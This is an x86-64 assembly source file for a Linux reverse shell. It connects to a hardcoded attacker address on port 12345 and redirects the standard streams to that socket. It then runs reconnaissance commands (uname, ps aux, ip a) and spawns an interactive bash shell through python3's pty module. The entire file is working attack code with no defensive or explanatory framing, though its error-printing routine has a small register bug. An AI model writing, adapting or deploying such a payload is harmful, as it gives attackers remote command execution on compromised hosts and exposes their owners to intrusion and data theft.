BITS 64

GLOBAL _start

; ------------------------------------------
; SECTION: Uninitialized Data (BSS)
; ------------------------------------------

SECTION .bss
struc sockaddr_in
        sin_family      resw 1
        sin_port        resw 1
        sin_addr        resd 1
endstruc
sock_fd resd 1

; ------------------------------------------
; SECTION: Read-Only Data (Constants)
; ------------------------------------------

SECTION .rodata
sh_cmd db "/usr/bin/python3", 0
arg1 db "-c", 0
arg2 db "import pty; pty.spawn('/bin/bash')", 0

info_cmd db "/bin/sh", 0
info_arg1 db "-c", 0
info_arg2 db "uname -a; uname -m; ps aux; ip a", 0

err_socket db "[-] Socket creation failed", 10, 0
err_connect db "[-] Connection failed", 10, 0
err_dup2 db "[-] dup2 failed", 10, 0
err_exec db "[-] execve failed", 10, 0

; ------------------------------------------
; SECTION: Network Configuration
; ------------------------------------------

init_struct:
        istruc sockaddr_in                      
                at sin_family,  dw 2            ; AF_INET (IPv4)
                at sin_port,    dw 0x3930       ; Port 12345 (little-endian)
 		at sin_addr,    dd 0x1E01A8C0   ; IP adress of the attacker : 192.168.1.30 (little-endian)
        iend

; ------------------------------------------
; SECTION: Code (Main Execution)
; ------------------------------------------

SECTION .text
_start:
        ; Create a socket
        mov rax, 41                             ; syscall: socket
        mov rdi, 2                              ; domain: AF_INET (IPv4)
        mov rsi, 1                              ; type: SOCK_STREAM
        mov rdx, 6                              ; protocol: IPPROTO_TCP
        syscall
        test rax, rax                           ; Check if syscall failed
        js handle_socket_error                  ; Jump if error (rax < 0)
        mov [sock_fd], rax                      ; Save socket FD

connect_to_host:
        ; Connect to attacker machine
        mov rax, 42                             ; syscall: connect
        mov rdi, [sock_fd]                      ; socket FD
        mov rsi, init_struct                    ; sockaddr_in struct
        mov rdx, 16                             ; size of sockaddr_in
        syscall
        test rax, rax
        js handle_connect_error

redirect_fds:
        ; Duplicate socket FD to stdin, stdout, and stderr
        mov rsi, 0
.loop:
        mov rax, 33                             ; syscall: dup2
        mov rdi, [sock_fd]
        syscall
        test rax, rax
        js handle_dup2_error
        inc rsi
        cmp rsi, 3
        jl .loop

execute_system_info:
        ; Fork a process
        mov rax, 57                             ; syscall: fork
        syscall
        test rax, rax
        jnz execute_interactive_shell           ; If parent, continue to shell

        ; Child process executes system info command
        mov rax, 59                             ; syscall: execve
        mov rdi, info_cmd                       ; path: /bin/sh
        lea rsi, [rel info_args]                ; argv = {"/bin/sh", "-c", "uname -a; uname -m; ps aux; ip a", NULL}
        xor rdx, rdx                            ; envp = NULL
        syscall
        jmp exit_program                        ; If exec fails, exit child

execute_interactive_shell:
        ; Execute Python3 to spawn a fully interactive Bash shell
        mov rax, 59                             ; syscall: execve
        mov rdi, sh_cmd                         ; path: /usr/bin/python3
        lea rsi, [rel args]                     ; argv = {"/usr/bin/python3", "-c", "import pty; pty.spawn('/bin/bash')", NULL}
        xor rdx, rdx                            ; envp = NULL
        syscall
        test rax, rax
        js handle_exec_error                    ; If execve fails, show error and exit

; ------------------------------------------
; ARGUMENT ARRAYS FOR EXECVE
; ------------------------------------------

args:
        dq sh_cmd
        dq arg1
        dq arg2
        dq 0

info_args:
        dq info_cmd
        dq info_arg1
        dq info_arg2
        dq 0

; ------------------------------------------
; ERROR HANDLING ROUTINES
; ------------------------------------------

handle_socket_error:
        mov rdi, err_socket
        call display_error_message
        jmp exit_program

handle_connect_error:
        mov rdi, err_connect
        call display_error_message
        jmp exit_program

handle_dup2_error:
        mov rdi, err_dup2
        call display_error_message
        jmp exit_program

handle_exec_error:
        mov rdi, err_exec
        call display_error_message
        jmp exit_program

; ------------------------------------------
; ERROR PRINTING FUNCTION
; ------------------------------------------

display_error_message:
        mov rax, 1                              ; syscall: write
        mov rdi, 2                              ; stderr
        mov rsi, rdi                            ; error message
        mov rdx, 30                             ; max length to write
        syscall
        ret

; ------------------------------------------
; EXIT PROGRAM FUNCTION
; ------------------------------------------

exit_program:
        mov rax, 60                             ; syscall: exit
        xor rdi, rdi                            ; exit(0)
        syscall
